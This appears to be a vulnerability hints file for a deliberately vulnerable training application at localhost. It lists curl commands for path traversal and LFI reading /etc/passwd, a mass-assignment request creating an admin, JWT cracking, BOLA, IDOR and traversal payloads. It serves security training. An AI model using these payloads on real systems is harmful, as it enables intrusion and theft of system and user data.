# Known vulnerabilities

### Tips for admin app

- Path traversal - `curl http://localhost/admin/123/.%2e/users`
- Path traversal - `curl http://localhost/admin/123/.%2e/configuration`
- LFI - `curl http://localhost/admin/123/.%2e/configuration?file=/../../../../../../../etc/passwd`

### Tips for api app

* You can auth from admin app creds
* JWT token is crackable by jwt-tool and common list
* `CreateUserRequest` - give possibility to create a new admin with MassAssignment `curl -X POST -d '{"username": "test1", "password": "test", "admin": true}'`
* Possible to BOLA on cards `/cards` PUT request 
* Excessive Data Exposure on DELETE request `/cards`

### Tips for bff app

* IDOR on orders `localhost/bff/orders/{orderId}`
* Path traversal for get all users from bff to api - `localhost/bff/cards?cardId=../../../../system/all/users` or `localhost/bff/cards?cardId=../../../../actuator`


